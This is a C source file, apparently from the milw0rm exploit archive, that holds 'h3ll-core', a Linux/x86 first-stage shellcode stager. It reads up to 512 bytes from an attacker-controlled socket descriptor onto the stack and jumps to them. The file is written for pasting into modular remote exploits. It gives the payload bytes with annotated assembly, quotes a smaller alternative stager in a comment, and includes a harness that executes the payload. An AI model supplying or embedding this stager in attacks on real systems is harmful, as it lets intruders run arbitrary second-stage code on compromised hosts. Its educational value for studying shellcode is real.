/* h3ll-core.c by Charles Stevenson <core@bokeoa.com>
 *
 * I made this as a chunk you can paste in to make modular remote
 * exploits.  I use it as a first stage payload when I desire to
 * follow up with a real large payload of goodness.  This actually
 * is a bit larger than necessary because of the error checking but
 * in some cases prooves nice.  For a tiny version of the same theme
 * check out mcb's 14 byte (saving of 15 bytes for all you
 * mathematician's out there ;).  The only problem might be that his
 * reads from stdin and can only reads 385 bytes less than mine.  So
 * If you like to go big on the shellcode use mine... otherwise here's
 * mcb's (or comment out the delimited lines below to shrink mine):
 *
 * "\x6a\x03\x58\x31\xdb\x6a\x7f\x5a\x89\xe1\xcd\x80\xff\xe4"
 *
 * I assume the file descriptor is in %esi.  Since that's where it
 * was on the last exploit I wrote.  Change the instruction to
 * the appropriate register from your fndsckcode or put an int in
 * there for and fd that's always the same.
 */
char hellcode[] = /* if(read(fd,buf,512)<=2) _exit(1) else buf(); linux/x86 by core */
//  uncomment the following line to raise SIGTRAP in gdb
// "\xcc"                    // int3
//  22 bytes:
//  if (read(fd,buf,512) <= 0x2) _exit(1) else buf();
"\x31\xdb"                  // xor    %ebx,%ebx
"\xf7\xe3"                  // mul    %ebx
"\x42"                      // inc    %edx
"\xc1\xe2\x09"              // shl    $0x9,%edx
"\x31\xf3"                  // xor    %esi,%ebx // (optional assumes fd in esi)
"\x04\x03"                  // add    $0x3,%al
"\x54"                      // push   %esp
"\x59"                      // pop    %ecx
"\xcd\x80"                  // int    $0x80
"\x3c\x02"                  // cmp    $0x02,%al // (optional error check)
"\x7e\x02"                  // jle    exit      // (optional exit clean)
"\xff\xe1"                  // jmp    *%ecx
//  7 bytes _exit(1) (optional _exit(1);)
"\x31\xc0"                  // xor    %eax,%eax
"\x40"                      // inc    %eax
"\x89\xc3"                  // mov    %eax,%ebx
"\xcd\x80"                  // int    $0x80
;

int main(void)
{
  void (*shell)() = (void *)&hellcode;
  printf("%d byte if(read(fd,buf,512)<=2) _exit(1) else buf(); linux/x86 by core\n\tNOTE: w/optional 11 bytes check and exit (recommend unless no room)\n",
         strlen(hellcode));
  shell();
  return 0;
}

// milw0rm.com [2005-11-09]